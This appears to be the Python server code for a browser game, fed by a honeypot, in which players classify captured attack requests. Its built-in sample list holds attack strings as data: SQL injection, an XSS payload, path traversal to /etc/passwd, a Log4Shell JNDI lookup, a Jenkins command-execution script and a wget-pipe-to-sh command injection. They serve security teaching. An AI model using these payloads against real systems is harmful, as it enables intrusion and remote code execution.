"""
Threat Hunter - a browser game fed by the live honeypot.

Real attack requests captured by the honeypot fall down the screen; the player must sort each one into the
right bucket before it lands. Scoring is done SERVER-SIDE against the honeypot's own classification, so the
client can't just post a fake score. IPs are masked and credentials are redacted before anything is sent out.
If the honeypot hasn't captured enough traffic yet, built-in sample attacks fill the gaps.
"""
import json, random, re, secrets, time, uuid
from datetime import datetime, timedelta, timezone
from pathlib import Path

from fastapi import FastAPI, HTTPException
from fastapi.responses import FileResponse, PlainTextResponse
from pydantic import BaseModel, Field

from common import db

db.init()
app = FastAPI(docs_url=None, redoc_url=None, openapi_url=None)

BUCKETS = ["recon", "creds", "injection", "exploit", "canary"]
BUCKET = {"Reconnaissance": "recon", "Benign/unknown": "recon", "Credential attack": "creds",
          "Credential/secret hunting": "creds", "Injection": "injection", "Exploit attempt": "exploit",
          "Credential reuse (CANARY)": "canary"}
LIVES, ROUND, BOSS_MAX = 3, 20, 5
RANKS = [(1800, "Elite Hunter"), (1200, "Threat Hunter"), (600, "Analyst"), (0, "Rookie")]


def rank_title(score):
    return next(t for lo, t in RANKS if score >= lo)
RUNS = {}   # run_id -> live game state (single-process; a restart only drops games in progress)

# (method, path, ua, answer) - used until the honeypot has captured enough real traffic
SAMPLES = [
    ("GET", "/wp-login.php", "Mozilla/5.0 (compatible; Nmap Scripting Engine)", "recon"),
    ("GET", "/phpmyadmin/index.php", "python-requests/2.31", "recon"),
    ("GET", "/server-status", "zgrab/0.x", "recon"),
    ("GET", "/cgi-bin/", "Nikto/2.5", "recon"),
    ("POST", "/wp-login.php  body: log=admin&pwd=••••", "Mozilla/5.0", "creds"),
    ("POST", "/api/v1/auth/login  body: {\"username\":\"root\",\"password\":\"••••\"}", "curl/8.4", "creds"),
    ("GET", "/.env", "Go-http-client/1.1", "creds"),
    ("GET", "/.git/config", "axios/1.6", "creds"),
    ("GET", "/index.php?id=1' OR '1'='1", "sqlmap/1.7", "injection"),
    ("GET", "/search?q=<script>alert(1)</script>", "Mozilla/5.0", "injection"),
    ("GET", "/download?file=../../../../etc/passwd", "curl/8.4", "injection"),
    ("GET", "/item?id=1 UNION SELECT user,pass FROM users--", "Mozilla/5.0", "injection"),
    ("GET", "/?x=${jndi:ldap://203.x.x.x/a}", "Mozilla/5.0", "exploit"),
    ("POST", "/jenkins/script  body: script='id'.execute().text", "Mozilla/5.0", "exploit"),
    ("GET", "/cgi-bin/x.cgi  ?cmd=;wget http://x/m.sh|sh", "Mozilla/5.0", "exploit"),
    ("GET", "/vendor/phpunit/src/Util/PHP/eval-stdin.php", "Mozilla/5.0", "exploit"),
    ("GET", "/  Authorization: AWS4 Credential=AKIA••••  (secret WE issued earlier)", "aws-cli/2.1", "canary"),
]
HEX16 = re.compile(r"[0-9a-fA-F]{16}")


def mask_ip(ip):
    p = (ip or "").split(".")
    return ".".join(p[:2] + ["x", "x"]) if len(p) == 4 else "x:x:x::"


def redact(s):
    s = re.sub(r"(?i)(pass(word|wd)?|pwd)(=|\":\s*\"?)[^&\"\s]*", r"\1\3••••", s or "")
    return HEX16.sub("••••", s)


def card_from_event(e):
    body = redact((e["body"] or "")[:70].replace("\n", " "))
    path = redact(e["path"] + ("?" + e["query"] if e["query"] else ""))[:90]
    return {"id": e["id"], "method": e["method"], "path": path, "ua": (e["ua"] or "-")[:48],
            "ip": mask_ip(e["ip"]), "body": body if e["method"] in ("POST", "PUT") and body else "",
            "badge": "🔑 secret we issued" if BUCKET.get(e["category"]) == "canary" else ""}


def pick_round(n):
    rows = db.query("""select id, ip, method, path, query, ua, body, category from events
                       where tags not like '%"mine"%' order by ts desc limit 600""")
    by = {b: [] for b in BUCKETS}
    seen = set()
    for r in rows:
        b = BUCKET.get(r["category"])
        key = (r["path"][:40], b)
        if b and key not in seen:
            seen.add(key); by[b].append(r)
    cards, bk = [], {}
    pools = {b: random.sample(v, len(v)) for b, v in by.items()}
    while len(cards) < n and any(pools.values()):          # round-robin so every bucket shows up
        for b in BUCKETS:
            if pools[b] and len(cards) < n:
                c = card_from_event(pools[b].pop())
                cards.append(c); bk[c["id"]] = b
    sample = random.sample(range(len(SAMPLES)), len(SAMPLES))
    for i in sample:                                         # pad with built-in samples
        if len(cards) >= n:
            break
        m, p, ua, _ = SAMPLES[i]
        cards.append({"id": f"syn-{i}", "method": m, "path": p, "ua": ua, "ip": "sample", "body": "",
                      "badge": "🔑 secret we issued" if SAMPLES[i][3] == "canary" else ""})
        bk[f"syn-{i}"] = SAMPLES[i][3]
    random.shuffle(cards)
    hard = [c for c in cards if bk[c["id"]] in ("exploit", "canary")]
    boss = hard[-BOSS_MAX:] if len(hard) >= 3 else []      # boss wave = the nastiest cards, played last
    for c in cards:
        c["boss"] = c in boss
    cards.sort(key=lambda c: c["boss"])                    # stable: boss cards move to the end
    return cards, sum(1 for c in cards if not c["id"].startswith("syn-"))


def truth(event_id):
    if event_id.startswith("syn-"):
        try:
            return SAMPLES[int(event_id[4:])][3]
        except (ValueError, IndexError):
            return None
    r = db.query("select category from events where id = ?", (event_id,))
    return BUCKET.get(r[0]["category"]) if r else None


# ------------------------------------------------------------------ API
@app.get("/")
def index():
    return FileResponse(Path(__file__).parent / "static" / "index.html")


@app.get("/healthz")
def healthz():
    return PlainTextResponse("ok")


@app.get("/api/start")
def start():
    cards, live = pick_round(ROUND)
    run_id = secrets.token_urlsafe(12)
    db.execute("insert into game_runs (run_id, ts, ids) values (?,?,?)",
               (run_id, datetime.now(timezone.utc).isoformat(timespec="seconds"), json.dumps([c["id"] for c in cards])))
    for k in [k for k, v in RUNS.items() if time.time() - v["start"] > 1800]:
        RUNS.pop(k, None)                                  # drop abandoned runs
    RUNS[run_id] = {"start": time.time(), "last": time.time(), "pending": {c["id"] for c in cards}, "total": len(cards),
                    "boss": {c["id"] for c in cards if c["boss"]},
                    "score": 0, "combo": 0, "best": 0, "correct": 0, "lives": LIVES, "over": False, "saved": False}
    return {"run_id": run_id, "lives": LIVES, "cards": cards, "live_events": live}


class Answer(BaseModel):
    run_id: str
    id: str
    choice: str = Field(max_length=20)


class Finish(BaseModel):
    run_id: str
    name: str = Field(default="anon", max_length=40)


@app.post("/api/answer")
def answer(a: Answer):
    st = RUNS.get(a.run_id)
    if not st or st["over"]:
        raise HTTPException(400, "unknown or finished run")
    if a.id not in st["pending"]:
        raise HTTPException(400, "card not in play")
    now = time.time()
    if now - st["last"] < 0.25:
        raise HTTPException(429, "too fast")              # crude anti-bot check
    st["last"] = now
    st["pending"].discard(a.id)
    t = truth(a.id)
    ok = t is not None and a.choice == t
    if ok:
        st["combo"] += 1; st["best"] = max(st["best"], st["combo"]); st["correct"] += 1
        pts = 100 + 10 * min(st["combo"] - 1, 10) + (50 if t == "canary" else 0)
        st["score"] += pts * (2 if a.id in st["boss"] else 1)     # boss wave = double points
    else:
        st["combo"] = 0; st["lives"] -= 1
    if st["lives"] <= 0 or not st["pending"]:
        st["over"] = True
    if not a.id.startswith("syn-"):
        db.execute("insert into game_answers (run_id, event_id, choice, correct, ts) values (?,?,?,?,?)",
                   (a.run_id, a.id, a.choice, int(ok), datetime.now(timezone.utc).isoformat(timespec="seconds")))
    return {"correct": ok, "truth": t, "score": st["score"], "combo": st["combo"], "lives": st["lives"], "over": st["over"]}


@app.post("/api/finish")
def finish(f: Finish):
    st = RUNS.get(f.run_id)
    if not st or not st["over"] or st["saved"]:
        raise HTTPException(400, "run not finished or already saved")
    st["saved"] = True
    name = re.sub(r"[^\w .\-]", "", f.name).strip()[:16] or "anon"
    db.execute("insert into scores (id, ts, name, score, correct, total) values (?,?,?,?,?,?)",
               (uuid.uuid4().hex[:10], datetime.now(timezone.utc).isoformat(timespec="seconds"), name,
                st["score"], st["correct"], st["total"]))
    rank = db.query("select count(*) as n from scores where score > ?", (st["score"],))[0]["n"] + 1
    RUNS.pop(f.run_id, None)
    return {"score": st["score"], "correct": st["correct"], "best_combo": st["best"], "rank": int(rank),
            "title": rank_title(st["score"])}


@app.get("/api/leaderboard")
def leaderboard(period: str = "all"):
    days = {"day": 1, "week": 7}.get(period)
    since = (datetime.now(timezone.utc) - timedelta(days=days)).isoformat(timespec="seconds") if days else ""
    rows = db.query("select name, score, correct, ts from scores where ts >= ? order by score desc, ts asc limit 10", (since,))
    for r in rows:
        r["title"] = rank_title(r["score"])
    return rows
